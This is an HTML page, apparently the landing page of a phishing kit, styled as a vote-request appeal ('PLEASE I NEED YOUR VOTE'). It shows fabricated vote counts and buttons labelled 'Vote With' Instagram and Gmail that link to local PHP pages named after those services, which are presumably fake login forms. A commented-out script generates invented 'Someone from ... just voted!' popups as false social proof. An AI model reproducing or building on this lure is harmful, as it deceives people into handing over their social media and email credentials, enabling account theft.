<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
        }
        .container {
            width: 25em;
            margin: 20px auto;
            padding: 15px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h2 {
            text-align: center;
            color: grey;
        }
        .sign{
            display: inline-block;
        }
        .nnn img {
            width: 25em;
        }
        .first-payment {
            color: rgb(85, 81, 81);
            font-weight: 900;
        }
        .progress-bar {
            width: 90%;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            position: relative;
            margin: 10px auto;
        }
        .progress-fill {
            height: 100%;
            background-color: blue;
            width: 90%; /* Adjust this to represent progress */
            transition: width 0.3s ease-in-out;
        }
     
         .btn1, .btn {
            height: 50px;
            width: 120px;
            font-weight: 600;
            font-size: 1.1em;
            border: 1px solid white;
            border-radius: 0.7em;
            cursor: pointer;
            color: #fff;
        }
        .btn1 {
            background-color: green;
        }
        .btn {
            background-color: red;
        }
        .footer {
            font-weight: bold;
            text-align: center;
            color: #af08e2;
            margin-top: 20px;
        }
        .btn1 img {
            height: 20px;
            width: 20px;
        }
        .btn img {
            height: 15px;
            width: 20px;
        }
        .rem{
            border: 2px solid blue;
        }
        .popup-container {
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            max-width: 100%;
        }
        .popup {
            background-color: green;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            margin-bottom: 10px;
            animation: fadeInOut 5s forwards;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(10px); }
            10%, 90% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(10px); }
        }

        .custom-radio {
  appearance: none;
  -webkit-appearance: none;
  background-color: blue; /* Green */
  border: 2px solid blue;
  width: 16px;
  height: 16px;
  border-radius: 50%;
  display: inline-block;
  position: relative;
  margin-right: 8px;
  vertical-align: middle;
  pointer-events: none; /* Not clickable */
}

.custom-radio::after {
  content: "";
  width: 8px;
  height: 8px;
  background-color: white;
  border-radius: 50%;
  position: absolute;
  top: 2px;
  left: 2px;
}
    </style>
    <title>Vote Us</title>
</head>
<body>
    <div class="container">
        <h2>PLEASE I NEED YOUR VOTE</h2>
        <div class="nnn">
            <img src="notenew.jpg" alt="Vote Image" class="Loading3">
        </div>
        <p style="font-weight: bold;">  Sign in to vote</p>
        <div >
            <div class="rem">
            <p class="first-payment">  <input type="radio" class="custom-radio" checked disabled>Total Votes: 5678 out of 5688</p>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>
            <p class="first-payment"><span style="color: black;">&#10003;</span> Total Vote to Win: 10</p>
        </div>
        <div class="nnn">
            <div class="sign">
            <a href="instagram/index.php" target="_blank">
                <button class="btn1">
                    Vote With <img src="ig5.JPG" alt="Instagram Icon" class="vote1">
                </button>
            </a>
        </div>
        <div class="sign">
            <a href="gmail/gmailpage.php" target="_blank">
                <button class="btn">
                    Vote With <img src="gmail2.JPG" alt="Gmail Icon" class="vote">
                </button>
            </a>
        </div>
    </div>
        
    </div>
    
    <!-- Popup container
    <div class="popup-container" id="popup-container"></div>

    <script>
        const locations = [
            "America Named Sophie",
            "Canada Named Alice",
            "India Named Aarav",
            "Australia Named Billie",
            "South Africa Named Andre",
            "Germany Named Bruno",
            "Brazil Named Maria",
            "Japan Named Hiroshi"
        ];

        function showPopup() {
            const randomLocation = locations[Math.floor(Math.random() * locations.length)];
            const popupContainer = document.getElementById('popup-container');
            
            const popup = document.createElement('div');
            popup.classList.add('popup');
            popup.textContent = `Someone from ${randomLocation} just voted!`;
            
            popupContainer.appendChild(popup);

            setTimeout(() => {
                popupContainer.removeChild(popup);
            }, 5000); // Remove the popup after 5 seconds
        }

        // Show a popup every 3 seconds
        setInterval(showPopup, 6000);
    </script>  -->
</body>
</html>
